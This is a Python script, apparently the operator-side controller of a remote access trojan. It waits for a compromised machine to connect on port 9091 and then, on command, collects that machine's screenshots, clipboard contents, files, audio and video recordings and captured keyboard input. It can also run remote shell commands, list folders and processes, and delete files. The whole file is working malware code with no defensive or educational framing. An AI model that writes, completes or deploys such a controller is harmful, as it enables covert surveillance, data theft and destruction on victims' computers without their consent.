# Created by Esmira Abdullaieva

import socket
import sys

path = "/Users/esmira.23/Desktop/KPI"

server = socket.socket()
IP = socket.gethostbyname(socket.gethostname())
server.bind((IP, 9091))
server.listen(1)
conn, addr = server.accept()

message = conn.recv(1024).decode()
print(f'{message} \n[ADDRESS] : {addr}')


def screen():
    file = open('/Users/esmira.23/Desktop/screen.jpg', mode='wb')
    img = conn.recv(1000000000)
    file.write(img)
    print("[SCREENSHOT RECEIVED]")


def discovery():
    inp = str(input('[PATH] : '))
    conn.send(inp.encode())
    out = conn.recv(2048).decode()
    print(out)


def system_info():
    info = conn.recv(1024).decode()
    print(f'[SYSTEM INFO] : {info}')


def command_line():
    inp = str(input('[COMMAND] : '))
    conn.send(inp.encode())
    out = conn.recv(2048).decode()
    print(out)


def clipboard():
    clip = conn.recv(1024).decode()
    print(f'[CLIPBOARD DATA] : \n{clip}')


def copy():
    inp = str(input('[PATH] : '))
    conn.send(inp.encode())
    file_name = input('[FILE NAME] : ')
    file = open('/Users/esmira.23/Desktop/' + file_name, mode='wb')
    out = conn.recv(1000000000)
    file.write(out)
    print("[FILE RECEIVED]")


def audio():
    file = open('/Users/esmira.23/Desktop/audio.wav', mode='wb')
    aud = conn.recv(1000000000)
    file.write(aud)
    print("[AUDIO RECEIVED]")


def video():
    file = open('/Users/esmira.23/Desktop/video.mov', mode='wb')
    aud = conn.recv(10000000)
    file.write(aud)
    print("[VIDEO RECEIVED]")


def delete():
    inp = str(input('[PATH] : '))
    conn.send(inp.encode())
    out = conn.recv(1024).decode()
    print(out)


def input_cap():
    inp = str(input('[COUNT] : '))
    conn.send(inp.encode())
    out = conn.recv(1024).decode()
    print(f'[INPUT CAPTURE] : \n{out}')


def proc_discovery():
    out = conn.recv(1024).decode()
    print(f'[PROCESS DISCOVERY] : \n{out}')


while True:
    data = str(input('>> '))
    conn.send(data.encode())
    if data == 'folder':
        discovery()
    if data == 'system':
        system_info()
    if data == 'screen':
        screen()
    if data == 'line':
        command_line()
    if data == 'clip':
        clipboard()
    if data == 'audio':
        audio()
    if data == 'video':
        video()
    if data == 'copy':
        copy()
    if data == 'delete':
        delete()
    if data == 'input':
        input_cap()
    if data == 'process':
        proc_discovery()
    if data == 'exit':
        a = conn.recv(1024).decode()
        print(a)
        break

server.close()
